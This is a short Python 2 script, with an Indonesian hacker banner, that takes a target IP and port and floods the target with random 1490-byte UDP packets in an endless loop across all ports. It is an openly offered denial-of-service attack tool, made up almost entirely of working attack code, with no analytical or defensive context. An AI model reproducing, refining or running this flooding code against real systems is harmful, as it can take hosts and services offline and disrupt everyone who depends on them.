#Ddos by Mr.T4X
#Mari Ber Senang-Senang Gans :D
#Hub: ("anonymoushackercyber@gmail.com")

import os
import sys
import socket
import random

#SET SOCK AND RANDOM
##########################################################
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) ##
bytes = random._urandom(1490)                           ##
##########################################################

os.system("clear")
print
print "\033[37;1m			>//< Author Mr.yM >//<                      "
print
print "    _  _  _  _                _                                  "
print "   (_)(_)(_)(_)              (_)                                 "
print "    (_)      (_)_    _  _  _ (_)    _  _  _       _  _  _  _     "
print "    (_)        (_) _(_)(_)(_)(_) _ (_)(_)(_) _  _(_)(_)(_)(_)    "
print "    (_)        (_)(_)        (_)(_)         (_)(_)_  _  _  _     "
print "    (_)       _(_)(_)        (_)(_)         (_)  (_)(_)(_)(_)_   "
print "    (_)_  _  (_)  (_)_  _  _ (_)(_) _  _  _ (_)   _  _  _  _(_)  "
print "   (_)(_)(_)(_)     (_)(_)(_)(_)   (_)(_)(_)     (_)(_)(_)(_)    "
print
ip = raw_input("IP Target : ")
port = input("Port       : ")
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "\033[32;1mSent %s packet to %s sampe down port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
